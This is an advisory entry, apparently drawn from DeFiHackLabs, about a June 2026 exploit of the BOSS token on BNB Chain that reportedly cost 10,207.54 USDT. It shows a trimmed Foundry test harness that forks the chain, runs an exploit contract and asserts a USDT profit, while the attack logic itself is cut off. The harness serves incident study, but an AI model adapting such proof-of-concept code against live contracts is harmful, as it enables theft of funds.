# [?] BOSS - BOSS helper mint/burn and transfer-tax pool skew

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BOSS
Published: 2026-06-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/BOSS_exp.sol
Type: defi-exploit-poc

## Details
Lost: 10,207.54 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 102_671_877;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(MOOLAH_FLASH_LOAN, "Moolah flash loan proxy");
        vm.label(MOOLAH_FLASH_LOAN_IMPLEMENTATION, "Moolah flash loan implementation");
        vm.label(BOSS, "BOSS token");
        vm.label(BOSS_HELPER, "BOSS helper");
        vm.label(BOSS_USDT_PAIR, "BOSS/USDT Pancake pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(PANCAKE_FACTORY, "Pancake factory");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public {
        BossExploit exploit = new BossExploit(ATTACKER);

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 10_000 ether, "USDT profit");
    }
}

contract BossExploit {
    address private immutable profitReceiver;
    uint256 private expectedFlashAmount;

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/BOSS_exp.sol_
